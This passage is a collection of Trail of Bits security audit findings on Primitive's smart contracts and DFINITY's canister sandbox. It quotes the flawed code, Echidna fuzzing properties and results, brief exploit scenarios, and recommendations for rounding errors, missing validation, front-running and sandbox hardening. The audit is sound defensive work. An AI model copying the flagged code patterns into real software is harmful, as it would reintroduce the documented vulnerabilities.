issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Primitive contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Lack of zero-value checks on functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. function deposit( address recipient, uint256 delRisky, uint256 delStable, bytes calldata data ) external override lock { if (delRisky == 0 && delStable == 0 ) revert ZeroDeltasError(); margins[recipient].deposit(delRisky, delStable); // state update uint256 balRisky; uint256 balStable; if (delRisky != 0 ) balRisky = balanceRisky(); if (delStable != 0 ) balStable = balanceStable(); IPrimitiveDepositCallback( msg.sender ).depositCallback(delRisky, delStable, data); // agnostic payment if (delRisky != 0 ) checkRiskyBalance(balRisky + delRisky); if (delStable != 0 ) checkStableBalance(balStable + delStable); emit Deposit( msg.sender , recipient, delRisky, delStable); } Figure 5.1: rmm-core/contracts/PrimitiveEngine.sol#L201-L219 Among others, the following functions lack zero-value checks on their arguments:  PrimitiveEngine.deposit  PrimitiveEngine.withdraw  PrimitiveEngine.allocate  PrimitiveEngine.swap  PositionDescriptor.constructor  MarginManager.deposit  MarginManager.withdraw  SwapManager.swap  CashManager.unwrap  CashManager.sweepToken Exploit Scenario Alice, a user, mistakenly provides the zero address as an argument when depositing for a recipient. As a result, her funds are saved in the margins of the zero address instead of a dierent address. Recommendations Short term, add zero-value checks for all function arguments to ensure that users cannot mistakenly set incorrect values, misconguring the system. Long term, use Slither, which will catch functions that do not have zero-value checks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. uint256.percentage() and int256.percentage() are not inverses of each other ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The Units library provides two percentage helper functions to convert unsigned integers to signed 64x64 xed-point values, and vice versa. Due to rounding errors, these functions are not direct inverses of each other. /// @notice Converts denormalized percentage integer to a fixed point 64.64 number /// @dev Convert unsigned 256-bit integer number into signed 64.64 fixed point number /// @param denorm Unsigned percentage integer with precision of 1e4 /// @return Signed 64.64 fixed point percentage with precision of 1e4 function percentage( uint256 denorm) internal pure returns ( int128 ) { return denorm. divu (PERCENTAGE); } /// @notice Converts signed 64.64 fixed point percentage to a denormalized percetage integer /// @param denorm Signed 64.64 fixed point percentage /// @return Unsigned percentage denormalized with precision of 1e4 function percentage( int128 denorm) internal pure returns ( uint256 ) { return denorm. mulu (PERCENTAGE); } Figure 6.1: rmm-core/contracts/libraries/Units.sol#L53-L66 These two functions use ABDKMath64x64.divu() and ABDKMath64x64.mulu() , which both round downward toward zero. As a result, if a uint256 value is converted to a signed 64x64 xed point and then converted back to a uint256 value, the result will not equal the original uint256 value: function scalePercentages (uint256 value ) public { require(value > Units.PERCENTAGE); int128 signedPercentage = value.percentage(); uint256 unsignedPercentage = signedPercentage.percentage(); if(unsignedPercentage != value) { emit AssertionFailed( \"scalePercentages\" , signedPercentage, unsignedPercentage); assert(false); } Figure 6.2: rmm-core/contracts/LibraryMathEchidna.sol#L48-L57 used Echidna to determine this property violation: Analyzing contract: /rmm-core/contracts/LibraryMathEchidna.sol:LibraryMathEchidna scalePercentages(uint256): failed! Call sequence: scalePercentages(10006) Event sequence: Panic(1), AssertionFailed(\"scalePercentages\", 18457812120153777346, 10005) Figure 6.3: Echidna results Exploit Scenario 1. uint256.percentage()  10006.percentage() = 1.0006 , which truncates down to 1. 2. int128.percentage()  1.percentage() = 10000 . 3. The assertion fails because 10006 != 10000 . Recommendations Short term, either remove the int128.percentage() function if it is unused in the system or ensure that the percentages round in the correct direction to minimize rounding errors. Long term, use Echidna to test system and mathematical invariants.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "7. Users can allocate tokens to a pool at the moment the pool reaches maturity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "Users can allocate tokens to a pool at the moment the pool reaches maturity, which creates an opportunity for attackers to front-run or update the curve right before the maturity period ends. function allocate ( bytes32 poolId , address recipient , uint256 delRisky , uint256 delStable , bool fromMargin , bytes calldata data ) external override lock returns ( uint256 delLiquidity ) { if (delRisky == 0 || delStable == 0 ) revert ZeroDeltasError(); Reserve.Data storage reserve = reserves[poolId]; if (reserve.blockTimestamp == 0 ) revert UninitializedError(); uint32 timestamp = _blockTimestamp(); if (timestamp > calibrations[poolId].maturity) revert PoolExpiredError(); uint256 liquidity0 = (delRisky * reserve.liquidity) / uint256 (reserve.reserveRisky); uint256 liquidity1 = (delStable * reserve.liquidity) / uint256 (reserve.reserveStable); delLiquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1; if (delLiquidity == 0 ) revert ZeroLiquidityError(); liquidity[recipient][poolId] += delLiquidity; // increase position liquidity reserve.allocate(delRisky, delStable, delLiquidity, timestamp); // increase reserves and liquidity if (fromMargin) { margins.withdraw(delRisky, delStable); // removes tokens from `msg.sender` margin account } else { ( uint256 balRisky , uint256 balStable ) = (balanceRisky(), balanceStable()); IPrimitiveLiquidityCallback( msg.sender ).allocateCallback(delRisky, delStable, data); // agnostic payment checkRiskyBalance(balRisky + delRisky); checkStableBalance(balStable + delStable); } emit Allocate( msg.sender , recipient, poolId, delRisky, delStable); } Figure 7.1: rmm-core/contracts/PrimitiveEngine.sol#L236-L268 Recommendations Short term, document the expected behavior of transactions to allocate funds into a pool that has just reached maturity and analyze the front-running risk. Long term, analyze all front-running risks on all transactions in the system.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Possible front-running vulnerability during BUFFER time ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The PrimitiveEngine.swap function permits swap transactions until 120 seconds after maturity, which could enable miners to front-run swap transactions and engage in malicious behavior. The constant tau value may allow miners to prot from front-running transactions when the swap curve is locked after maturity. SwapDetails memory details = SwapDetails({ recipient: recipient, poolId: poolId, deltaIn: deltaIn, deltaOut: deltaOut, riskyForStable: riskyForStable, fromMargin: fromMargin, toMargin: toMargin, timestamp: _blockTimestamp() }); uint32 lastTimestamp = _updateLastTimestamp(details.poolId); // updates lastTimestamp of `poolId` if (details.timestamp > lastTimestamp + BUFFER) revert PoolExpiredError(); // 120s buffer to allow final swaps Figure 8.1: rmm-core/contracts/PrimitiveEngine.sol#L314-L326 Recommendations Short term, perform an o-chain analysis on the curve and the swaps to determine the impact of a front-running attack on these transactions. Long term, perform an additional economic analysis with historical data on pools to determine the impact of front-running attacks on all functionality in the system.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "9. Inconsistency in allocate and remove functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The allocate and remove functions do not have the same interface, as one would expect. The allocate function allows users to set the recipient of the allocated liquidity and choose whether the funds will be taken from the margins or sent directly. The remove function unallocates the liquidity from the pool and sends the tokens to the msg.sender ; with this function, users cannot set the recipient of the tokens or choose whether the tokens will be credited to their margins for future use or directly sent back to them. function allocate ( bytes32 poolId , address recipient , uint256 delRisky , uint256 delStable , bool fromMargin , bytes calldata data ) external override lock returns ( uint256 delLiquidity ) { if (delRisky == 0 || delStable == 0 ) revert ZeroDeltasError(); Reserve.Data storage reserve = reserves[poolId]; if (reserve.blockTimestamp == 0 ) revert UninitializedError(); uint32 timestamp = _blockTimestamp(); if (timestamp > calibrations[poolId].maturity) revert PoolExpiredError(); uint256 liquidity0 = (delRisky * reserve.liquidity) / uint256 (reserve.reserveRisky); uint256 liquidity1 = (delStable * reserve.liquidity) / uint256 (reserve.reserveStable); delLiquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1; if (delLiquidity == 0 ) revert ZeroLiquidityError(); liquidity[recipient][poolId] += delLiquidity; // increase position liquidity reserve.allocate(delRisky, delStable, delLiquidity, timestamp); // increase reserves and liquidity if (fromMargin) { margins.withdraw(delRisky, delStable); // removes tokens from `msg.sender` margin account } else { ( uint256 balRisky , uint256 balStable ) = (balanceRisky(), balanceStable()); IPrimitiveLiquidityCallback( msg.sender ).allocateCallback(delRisky, delStable, data); // agnostic payment checkRiskyBalance(balRisky + delRisky); checkStableBalance(balStable + delStable); } emit Allocate( msg.sender , recipient, poolId, delRisky, delStable); } Figure 9.1: rmm-core/contracts/PrimitiveEngine.sol#L236-L268 Recommendations Short term, either document the design decision or add the logic to the remove function allowing users to set the recipient and to choose whether the tokens should be credited to their margins . Long term, make sure to document design decisions and the rationale behind them, especially for behavior that may not be obvious.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "10. Areas of the codebase that are inconsistent with the documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The Primitive codebase contains clear documentation and mathematical analysis denoting the intended behavior of the system. However, we identied certain areas in which the implementation does not match the white paper, including the following:  Expected range for the gamma value of a pool. The white paper denes 10,000 as 100% in the smart contract; however, the contract checks that the provided gamma is between 9,000 (inclusive) and 10,000 (exclusive); if it is not within this range, the pool reverts with a GammaError . The white paper should be updated to reect the behavior of the code in these areas. Recommendations Short term, review and properly document all areas of the codebase with this gamma range check. Long term, ensure that the formal specication matches the expected behavior of the protocol.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "11. Allocate and remove are not exact inverses of each other ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "Due to the rounding logic used in the codebase, when users allocate funds into a system, they may not receive the same amount back when they remove them. When funds are allocated into a system, the values are rounded down (through native truncation) when they are added to the reserves: /// @notice Add to both reserves and total supply of liquidity /// @param reserve Reserve storage to manipulate /// @param delRisky Amount of risky tokens to add to the reserve /// @param delStable Amount of stable tokens to add to the reserve /// @param delLiquidity Amount of liquidity created with the provided tokens /// @param blockTimestamp Timestamp used to update cumulative reserves function allocate ( Data storage reserve, uint256 delRisky , uint256 delStable , uint256 delLiquidity , uint32 blockTimestamp ) internal { update(reserve, blockTimestamp); reserve.reserveRisky += delRisky.toUint128(); reserve.reserveStable += delStable.toUint128(); reserve.liquidity += delLiquidity.toUint128(); } Figure 11.1: rmm-core/contracts/libraries/Reserve.sol#L70-L87 When funds are removed from the reserves, they are similarly truncated: /// @notice Remove from both reserves and total supply of liquidity /// @param reserve Reserve storage to manipulate /// @param delRisky Amount of risky tokens to remove to the reserve /// @param delStable Amount of stable tokens to remove to the reserve /// @param delLiquidity Amount of liquidity removed from total supply /// @param blockTimestamp Timestamp used to update cumulative reserves function remove( Data storage reserve, uint256 delRisky, uint256 delStable, uint256 delLiquidity, uint32 blockTimestamp ) internal { update(reserve, blockTimestamp); reserve.reserveRisky -= delRisky.toUint128(); reserve.reserveStable -= delStable.toUint128(); reserve.liquidity -= delLiquidity.toUint128(); } Figure 11.2: rmm-core/contracts/libraries/Reserve.sol#L89-L106 We used the following Echidna property to test this behavior: function check_allocate_remove_inverses( uint256 randomId, uint256 intendedLiquidity, bool fromMargin ) public { AllocateCall memory allocate; allocate.poolId = Addresses.retrieve_created_pool(randomId); retrieve_current_pool_data(allocate.poolId, true ); intendedLiquidity = E2E_Helper.one_to_max_uint64(intendedLiquidity); allocate.delRisky = (intendedLiquidity * precall.reserve.reserveRisky) / precall.reserve.liquidity; allocate.delStable = (intendedLiquidity * precall.reserve.reserveStable) / precall.reserve.liquidity; uint256 delLiquidity = allocate_helper(allocate); // these are calculated the amount returned when remove is called ( uint256 removeRisky, uint256 removeStable) = remove_should_succeed(allocate.poolId, delLiquidity); emit AllocateRemoveDifference(allocate.delRisky, removeRisky); emit AllocateRemoveDifference(allocate.delStable, removeStable); assert (allocate.delRisky == removeRisky); assert (allocate.delStable == removeStable); assert (intendedLiquidity == delLiquidity); } Figure 11.3: rmm-core/contracts/libraries/Reserve.sol#L89-L106 In considering this rounding logic, we used Echidna to calculate the most optimal allocate value for an amount of liquidity, which resulted 1,920,041,647,503 as the dierence in the amount allocated and the amount removed. check_allocate_remove_inverses(uint256,uint256,bool): failed! Call sequence: create_new_pool_should_not_revert(113263940847354084267525170308314,0,12,58,414705177,292070 35433870938731770491094459037949100611312053389816037169023399245174) from: 0x0000000000000000000000000000000000020000 Gas: 0xbebc20 check_allocate_remove_inverses(513288669432172152578276403318402760987129411133329015270396, 675391606931488162786753316903883654910567233327356334685,false) from: 0x1E2F9E10D02a6b8F8f69fcBf515e75039D2EA30d Event sequence: Panic(1), Transfer(6361150874), Transfer(64302260917206574294870), AllocateMarginBalance(0, 0, 6361150874, 64302260917206574294870), Transfer(6361150874), Transfer(64302260917206574294870), Allocate(6361150874, 64302260917206574294870), Remove(6361150873, 64302260915286532647367), AllocateRemoveDifference(6361150874, 6361150873), AllocateRemoveDifference( 64302260917206574294870, 64302260915286532647367 ) Figure 11.4: Echidna results Exploit Scenario Alice, a Primitive user, determines a specic amount of liquidity that she wants to put into the system. She calculates the required risky and stable tokens to make the trade, and then allocates the funds to the pool. Due to the rounding direction in the allocate operation and the pool, she receives less than she expected after removing her liquidity. Recommendations Short term, perform additional analysis to determine a safe delta value to allow the allocate and remove operations to happen. Document this issue for end users to ensure that they are aware of the rounding behavior. Long term, use Echidna to test system and mathematical invariants.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "12. scaleToX64() and scalefromX64() are not inverses of each other ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The Units library provides the scaleToX64() and scalefromX64() helper functions to convert unsigned integers to signed 64x64 xed-point values, and vice versa. Due to rounding errors, these functions are not direct inverses of each other. /// @notice Converts unsigned 256-bit wei value into a fixed point 64.64 number /// @param value Unsigned 256-bit wei amount, in native precision /// @param factor Scaling factor for `value`, used to calculate decimals of `value` /// @return y Signed 64.64 fixed point number scaled from native precision function scaleToX64 ( uint256 value , uint256 factor ) internal pure returns ( int128 y ) { uint256 scaleFactor = PRECISION / factor; y = value.divu(scaleFactor); } Figure 12.1: rmm-core/contracts/libraries/Units.sol#L35-L42 These two functions use ABDKMath64x64.divu() and ABDKMath64x64.mulu() , which both round downward toward zero. As a result, if a uint256 value is converted to a signed 64x64 xed point and then converted back to a uint256 value, the result will not equal the original uint256 value: /// @notice Converts signed fixed point 64.64 number into unsigned 256-bit wei value /// @param value Signed fixed point 64.64 number to convert from precision of 10^18 /// @param factor Scaling factor for `value`, used to calculate decimals of `value` /// @return y Unsigned 256-bit wei amount scaled to native precision of 10^(18 - factor) function scalefromX64 ( int128 value , uint256 factor ) internal pure returns ( uint256 y ) { uint256 scaleFactor = PRECISION / factor; y = value.mulu(scaleFactor); } Figure 12.2: rmm-core/contracts/libraries/Units.sol#L44-L51 We used the following Echidna property to test this behavior: function scaleToAndFromX64Inverses (uint256 value , uint256 _decimals ) public { // will enforce factor between 0 - 12 uint256 factor = _decimals % ( 13 ); // will enforce scaledFactor between 1 - 10**12 , because 10**0 = 1 uint256 scaledFactor = 10 **factor; int128 scaledUpValue = value.scaleToX64(scaledFactor); uint256 scaledDownValue = scaledUpValue.scalefromX64(scaledFactor); assert(scaledDownValue == value); } Figure 12.3: contracts/crytic/LibraryMathEchidna.sol scaleToAndFromX64Inverses(uint256,uint256): failed! Call sequence: scaleToAndFromX64Inverses(1,0) Event sequence: Panic(1) Figure 12.4: Echidna results Recommendations Short term, ensure that the percentages round in the correct direction to minimize rounding errors. Long term, use Echidna to test system and mathematical invariants.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "13. getCDF always returns output in the range of (0, 1) ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "CumulativeNormalDistribution provides the getCDF function to calculate an approximation of the cumulative distribution function, which should result in (0, 1] ; however, the getCDF function could return 1 . /// @notice Uses Abramowitz and Stegun approximation: /// https://en.wikipedia.org/wiki/Abramowitz_and_Stegun /// @dev Maximum error: 3.15x10-3 /// @return Standard Normal Cumulative Distribution Function of `x` function getCDF( int128 x) internal pure returns ( int128 ) { int128 z = x.div(CDF3); int128 t = ONE_INT.div(ONE_INT.add(CDF0.mul(z.abs()))); int128 erf = getErrorFunction(z, t); if (z < 0 ) { erf = erf.neg(); } int128 result = (HALF_INT).mul(ONE_INT.add(erf)); return result; } Figure 13.1: rmm-core/contracts/libraries/CumulativeNormalDistribution.sol#L24-L37 We used the following Echidna property to test this behavior. function CDFCheckRange( uint128 x, uint128 neg) public { int128 x_x = realisticCDFInput(x, neg); int128 res = x_x.getCDF(); emit P(x_x, res, res.toInt()); assert (res > 0 && res.toInt() < 1 ); } Figure 13.2: rmm-core/contracts/LibraryMathEchidna.sol CDFCheckRange(uint128,uint128): failed! Call sequence: CDFCheckRange(168951622815827493037,1486973755574663235619590266651) Event sequence: Panic(1), P(168951622815827493037, 18446744073709551616, 1) Figure 13.3: Echidna results Recommendations Short term, perform additional analysis to determine whether this behavior is an issue for the system. Long term, use Echidna to test system and mathematical invariants.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "14. Lack of data validation on withdrawal operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The withdraw function allows users to specify the recipient to send funds to. Due to a lack of data validation, the address of the engine could be set as the recipient. As a result, the tokens will be transferred directly to the engine itself. /// @inheritdoc IPrimitiveEngineActions function withdraw ( address recipient , uint256 delRisky , uint256 delStable ) external override lock { if (delRisky == 0 && delStable == 0 ) revert ZeroDeltasError(); margins.withdraw(delRisky, delStable); // state update if (delRisky != 0 ) IERC20(risky).safeTransfer(recipient, delRisky); if (delStable != 0 ) IERC20(stable).safeTransfer(recipient, delStable); emit Withdraw( msg.sender , recipient, delRisky, delStable); } Figure 14.1: rmm-core/contracts/PrimitiveEngine.sol#L221-L232 We used the following Echidna property to test this behavior. function withdraw_with_only_non_zero_addr( address recipient, uint256 delRisky, uint256 delStable ) public { require (recipient != address ( 0 )); //ensures that delRisky and delStable are at least 1 and not too large to overflow the deposit delRisky = E2E_Helper.one_to_max_uint64(delRisky); delStable = E2E_Helper.one_to_max_uint64(delStable); MarginHelper memory senderMargins = populate_margin_helper( address ( this )); if (senderMargins.marginRisky < delRisky || senderMargins.marginStable < delStable) { withdraw_should_revert(recipient, delRisky, delStable); } else { withdraw_should_succeed(recipient, delRisky, delStable); } } function withdraw_should_succeed ( address recipient , uint256 delRisky , uint256 delStable ) internal { MarginHelper memory precallSender = populate_margin_helper( address ( this )); MarginHelper memory precallRecipient = populate_margin_helper(recipient); uint256 balanceRecipientRiskyBefore = risky.balanceOf(recipient); uint256 balanceRecipientStableBefore = stable.balanceOf(recipient); uint256 balanceEngineRiskyBefore = risky.balanceOf( address (engine)); uint256 balanceEngineStableBefore = stable.balanceOf( address (engine)); ( bool success , ) = address (engine).call( abi.encodeWithSignature( \"withdraw(address,uint256,uint256)\" , recipient, delRisky, delStable) ); if (!success) { assert( false ); return ; } { assert_post_withdrawal(precallSender, precallRecipient, recipient, delRisky, delStable); //check token balances uint256 balanceRecipientRiskyAfter = risky.balanceOf(recipient); uint256 balanceRecipientStableAfter = stable.balanceOf(recipient); uint256 balanceEngineRiskyAfter = risky.balanceOf( address (engine)); uint256 balanceEngineStableAfter = stable.balanceOf( address (engine)); emit DepositWithdraw( \"balance recip risky\" , balanceRecipientRiskyBefore, balanceRecipientRiskyAfter, delRisky); emit DepositWithdraw( \"balance recip stable\" , balanceRecipientStableBefore, balanceRecipientStableAfter, delStable); emit DepositWithdraw( \"balance engine risky\" , balanceEngineRiskyBefore, balanceEngineRiskyAfter, delRisky); emit DepositWithdraw( \"balance engine stable\" , balanceEngineStableBefore, balanceEngineStableAfter, delStable); assert(balanceRecipientRiskyAfter == balanceRecipientRiskyBefore + delRisky); assert(balanceRecipientStableAfter == balanceRecipientStableBefore + delStable); assert(balanceEngineRiskyAfter == balanceEngineRiskyBefore - delRisky); assert(balanceEngineStableAfter == balanceEngineStableBefore - delStable); } } Figure 14.2: rmm-core/contracts/crytic/E2E_Deposit_Withdrawal.sol withdraw_with_safe_range(address,uint256,uint256): failed! Call sequence: deposit_with_safe_range(0xa329c0648769a73afac7f9381e08fb43dbea72,115792089237316195423570985 008687907853269984665640564039447584007913129639937,5964323976539599410180707317759394870432 1625682232592596462650205581096120955) from: 0x1E2F9E10D02a6b8F8f69fcBf515e75039D2EA30d withdraw_with_safe_range(0x48bacb9266a570d521063ef5dd96e61686dbe788,5248038478797710845,748) from: 0x6A4A62E5A7eD13c361b176A5F62C2eE620Ac0DF8 Event sequence: Panic(1), Transfer(5248038478797710846), Transfer(749), Withdraw(5248038478797710846, 749), DepositWithdraw(\"sender risky\", 8446744073709551632, 3198705594911840786, 5248038478797710846), DepositWithdraw(\"sender stable\", 15594018607531992466, 15594018607531991717, 749), DepositWithdraw(\"balance recip risky\", 8446744073709551632, 8446744073709551632, 5248038478797710846), DepositWithdraw(\"balance recip stable\", 15594018607531992466, 15594018607531992466, 749), DepositWithdraw(\"balance engine risky\", 8446744073709551632, 8446744073709551632, 5248038478797710846), DepositWithdraw(\"balance engine stable\", 15594018607531992466, 15594018607531992466, 749) Figure 14.3: Echidna results Exploit Scenario Alice, a user, withdraws her funds from the Primitive engine. She accidentally species the address of the recipient as the engine address, and her funds are left stuck in the contract. Recommendations Short term, add a check to ensure that users cannot withdraw to the engine address directly to ensure that users are protected from these mistakes. Long term, use Echidna to test system and mathematical invariants.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. The canister sandbox has vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "The canister sandbox codebase uses the following vulnerable or unmaintained Rust dependencies. (All of the crates listed are indirect dependencies of the codebase.) Dependency Version ID", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Complete environment of the replica is passed to the sandboxed process ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When the spawn_socketed_process function spawns a new sandboxed process, the call to the Command::spawn method passes the entire environment of the replica to the sandboxed process. pub fn spawn_socketed_process( exec_path: &str, argv: &[String], socket: RawFd, ) -> std::io::Result<Child> { let mut cmd = Command::new(exec_path); cmd.args(argv); // In case of Command we inherit the current process's environment. This should // particularly include things such as Rust backtrace flags. It might be // advisable to filter/configure that (in case there might be information in // env that the sandbox process should not be privy to). // The following block duplicates sock_sandbox fd under fd 3, errors are // handled. unsafe { cmd.pre_exec(move || { let fd = libc::dup2(socket, 3); if fd != 3 { return Err(std::io::Error::last_os_error()); } Ok(()) }) }; let child_handle = cmd.spawn()?; Ok(child_handle) } Figure 2.1: canister_sandbox/common/src/process.rs:17- The DFINITY team does not use environment variables for sensitive information. However, sharing the environment with the sandbox introduces a latent risk that system conguration data or other sensitive data could be leaked to the sandboxed process in the future. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. Since the environment of the replica was leaked to the sandbox when the process was created, the canister gains information about the system that it is running on and learns sensitive information passed as environment variables to the replica, making further eorts to compromise the system easier. Recommendations Short term, add code that lters the environment passed to the sandboxed process (e.g., Command::env_clear or Command::env_remove) to ensure that no sensitive information is leaked if the sandbox is compromised.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. SELinux policy allows the sandbox process to write replica log messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When a new sandboxed process is spawned using Command::spawn, the processs stdin, stdout, and stderr le descriptors are inherited from the parent process. The SELinux policy for the canister sandbox currently allows sandboxed processes to read from and write to all le descriptors inherited from the replica (the le descriptors created by init when the replica is started, as well as the le descriptor used for interprocess RPC). As a result, a compromised sandbox could spoof log messages to the replica's stdout or stderr. # Allow to use the logging file descriptor inherited from init. # This should actually not be allowed, logs should be routed through # replica. allow ic_canister_sandbox_t init_t : fd { use }; allow ic_canister_sandbox_t init_t : unix_stream_socket { read write }; Figure 3.1: guestos/rootfs/prep/ic-node/ic-node.te:312-316 Additionally, sandboxed processes read and write access to les with the tmpfs_t context appears to be overly broad, but considering the fact that sandboxed processes are not allowed to open les, we did not see any way to exploit this. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By writing fake log messages to the replicas stderr le descriptor, the canister makes it look like the replica has other issues, masking the compromise and making incident response more dicult. Recommendations Short term, change the SELinux policy to disallow sandboxed processes from reading from and writing to the inherited le descriptors stdin, stdout, and stderr.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Canister sandbox system calls are not ltered using Seccomp ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "Seccomp provides a framework to lter outgoing system calls. Using Seccomp, a process can limit the type of system calls available to it, thereby limiting the available attack surface of the kernel. The current implementation of the canister sandbox does not use Seccomp; instead, it relies on mandatory access controls (via SELinux) to restrict the system calls available to a sandboxed process. While SELinux is useful for restricting access to les, directories, and other processes, Seccomp provides more ne-grained control over kernel system calls and their arguments. For this reason, Seccomp (in particular, Seccomp-BPF) is a useful complement to SELinux in restricting a sandboxed processs access to the system. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By exploiting a vulnerability in the kernel, it is able to break out of the sandbox and execute arbitrary code on the node. Recommendations Long term, consider using Seccomp-BPF to restrict the system calls available to a sandboxed process. Extra care must be taken when the canister sandbox (or any of its dependencies) is updated to ensure that the set of system calls invoked during normal execution has not changed.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "5. Invalid system state changes cause the replica to panic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When a sandboxed process has completed an execution request, the hypervisor calls SystemStateChanges::apply_changes (in Hypervisor::execute) to apply the system state changes to the global canister system state. pub fn apply_changes(self, system_state: &mut SystemState) { // Verify total cycle change is not positive and update cycles balance. assert!(self.cycle_change_is_valid( system_state.canister_id == CYCLES_MINTING_CANISTER_ID )); self.cycles_balance_change .apply_ref(system_state.balance_mut()); // Observe consumed cycles. system_state .canister_metrics .consumed_cycles_since_replica_started += NominalCycles::from_cycles(self.cycles_consumed); // Verify we don't accept more cycles than are available from each call // context and update each call context balance if !self.call_context_balance_taken.is_empty() { let call_context_manager = system_state.call_context_manager_mut().unwrap(); for (context_id, amount_taken) in &self.call_context_balance_taken { let call_context = call_context_manager .call_context_mut(*context_id) .expect(\"Canister accepted cycles from invalid call context\"); call_context .withdraw_cycles(*amount_taken) .expect(\"Canister accepted more cycles than available ...\"); } } // Push outgoing messages. for msg in self.requests { system_state .push_output_request(msg) .expect(\"Unable to send new request\"); } // Verify new certified data isn't too long and set it. if let Some(certified_data) = self.new_certified_data.as_ref() { assert!(certified_data.len() <= CERTIFIED_DATA_MAX_LENGTH as usize); system_state.certified_data = certified_data.clone(); } // Verify callback ids and register new callbacks. for update in self.callback_updates { match update { CallbackUpdate::Register(expected_id, callback) => { let id = system_state .call_context_manager_mut() .unwrap() .register_callback(callback); assert_eq!(id, expected_id); } CallbackUpdate::Unregister(callback_id) => { let _callback = system_state .call_context_manager_mut() .unwrap() .unregister_callback(callback_id) .expect(\"Tried to unregister callback with an id ...\"); } } } } Figure 5.1: system_api/src/sandbox_safe_system_state.rs:99-157 The apply_changes method uses assert and expect to ensure that system state invariants involving cycle balances, call contexts, and callback updates are upheld. By sending a WebAssembly (Wasm) execution output with invalid system state changes, a compromised sandboxed process could use this to cause the replica to panic. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister sends a Wasm execution output message containing invalid state changes to the replica, which causes the replica process to panic, crashing the entire subnet. Recommendations Short term, revise SystemStateChanges::apply_changes so that it returns an error if the system state changes from a sandboxed process are found to be invalid. Long term, audit the codebase for the use of panicking functions and macros like assert, unreachable, unwrap, or expect in code that validates data from untrusted sources.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "6. SandboxedExecutionController does not enforce memory size invariants ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When a sandboxed process has completed an execution request, the execution state is updated by the SandboxedExecutionController::process method with the data from the execution output. // Unless execution trapped, commit state (applying execution state // changes, returning system state changes to caller). let system_state_changes = if exec_output.wasm.wasm_result.is_ok() { if let Some(state_modifications) = exec_output.state { // TODO: If a canister has broken out of wasm then it might have allocated // more wasm or stable memory than allowed. We should add an additional // check here that the canister is still within its allowed memory usage. execution_state .wasm_memory .page_map .deserialize_delta(state_modifications.wasm_memory.page_delta); execution_state.wasm_memory.size = state_modifications.wasm_memory.size; execution_state.wasm_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_wasm_memory_id), ); execution_state .stable_memory .page_map .deserialize_delta(state_modifications.stable_memory.page_delta); execution_state.stable_memory.size = state_modifications.stable_memory.size; execution_state.stable_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_stable_memory_id), ); // ... <redacted> state_modifications.system_state_changes } else { SystemStateChanges::default() } } else { 